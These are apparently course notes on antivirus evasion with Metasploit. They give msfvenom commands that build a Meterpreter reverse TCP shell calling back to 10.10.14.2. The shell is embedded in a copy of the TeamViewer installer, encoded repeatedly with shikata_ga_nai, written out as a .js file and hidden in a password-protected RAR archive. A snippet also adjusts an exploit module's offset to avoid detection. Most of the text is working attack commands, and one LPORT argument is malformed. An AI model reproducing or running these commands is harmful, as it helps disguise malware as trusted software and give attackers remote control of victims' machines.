# Embed the payload in exe 
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080-k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
#### Hiding information in a file 
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080-k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

# Extract .gz file in Linux 
```
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
```
```
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```
```
rar a ~/test.rar -p ~/test.js
```

# Packers 
The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. 

# Exploit coding 
When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system. 

This can be done by inputting an Offset switch inside the code for the msfconsole module 
```
'Targets'=>[['Windows 2000 SP4 English',{'Ret'=>0x77e14c29,'Offset'=>5093}],],
```
